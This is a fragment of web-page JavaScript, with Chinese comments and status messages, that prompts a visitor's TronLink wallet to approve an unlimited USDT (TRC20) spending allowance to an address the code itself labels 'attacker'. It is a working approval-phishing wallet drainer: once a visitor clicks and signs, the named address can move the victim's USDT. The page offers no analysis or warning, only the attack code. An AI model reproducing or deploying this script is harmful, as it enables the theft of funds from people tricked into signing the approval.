  <script>

    const USDT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";  // TRC20 主網 USDT

    const attacker = "TBX8foxSthqVpiKqR87gN62M6oE91EKX7B"; // 主控地址（TRON）


    async function approve() {

      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {

        alert("請先安裝並登入 TronLink 錢包");

        return;

      }


      document.getElementById("status").innerText = "⏳ 發送授權中...";


      try {

        const contract = await window.tronWeb.contract().at(USDT);

        const tx = await contract.approve(attacker, window.tronWeb.toBigNumber("9223372036854775807")).send(); // TRC20 沒有 MaxUint256

        document.getElementById("status").innerText = "✅ 授權成功，TX ID: " + tx;

      } catch (err) {

        console.error(err);

        document.getElementById("status").innerText = "❌ 授權失敗: " + err.message;

      }

    }
